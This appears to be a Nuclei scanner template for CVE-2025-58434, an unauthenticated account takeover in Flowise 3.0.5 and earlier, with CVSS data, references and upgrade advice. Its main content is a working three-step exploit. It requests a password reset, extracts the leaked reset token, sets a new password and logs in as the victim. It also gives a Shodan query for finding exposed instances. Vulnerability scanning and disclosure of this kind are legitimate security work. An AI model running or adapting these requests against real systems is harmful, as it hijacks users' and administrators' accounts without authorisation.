flow: http(1) && http(2) && http(3)
http:
- extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - '"tempToken":"([A-Za-z0-9]{64})"'
    type: regex
  matchers:
  - dsl:
    - status_code == 201
    internal: true
    type: dsl
  raw:
  - 'POST /api/v1/account/forgot-password HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"user":{"email":"{{username}}"}}

    '
- matchers:
  - dsl:
    - status_code == 201
    internal: true
    type: dsl
  raw:
  - "POST /api/v1/account/reset-password HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"user\": {\n    \"email\": \"{{username}}\",\n   \
    \ \"tempToken\": \"{{token}}\",\n    \"password\": \"{{new_password}}\"\n  }\n\
    }\n"
- extractors:
  - dsl:
    - '"Password:" + new_password'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, 'id', '{{username}}', 'activeWorkspaceId')
    type: dsl
  matchers-condition: and
  raw:
  - "POST /api/v1/auth/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"email\": \"{{username}}\",\n  \"password\": \"{{new_password}}\"\n}\n"
id: CVE-2025-58434
info:
  author: nukunga[seunghyeonJeon]
  classification:
    cve-id: CVE-2025-58434
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-306
    epss-percentile: 0.91888
    epss-score: 0.08177
  description: "Flowise versions 3.0.5 and earlier had a vulnerability in the forgot-password\
    \ endpoint, which returned valid reset tokens without authentication\u2014allowing\
    \ attackers to reset passwords and take over accounts.\n"
  impact: 'Unauthenticated attackers can obtain valid password reset tokens without
    authentication, enabling account takeover of any user including administrators
    through password reset attacks.

    '
  metadata:
    shodan-query: http.title:"Flowise - Build AI Agents, Visually"
    verified: true
  name: Flowise <= 3.0.5 - Account Takeover
  reference:
  - https://github.com/advisories/GHSA-wgpv-6j63-x5ph
  - https://nvd.nist.gov/vuln/detail/CVE-2025-58434
  remediation: 'Upgrade Flowise to version 3.0.6 or later that properly protects password
    reset token generation.

    '
  severity: critical
  tags: cve,cve2025,flowise,ato,rce,unauth,vuln
variables:
  new_password: '{{rand_text_alphanumeric(12)}}'
  username: '{{username}}'
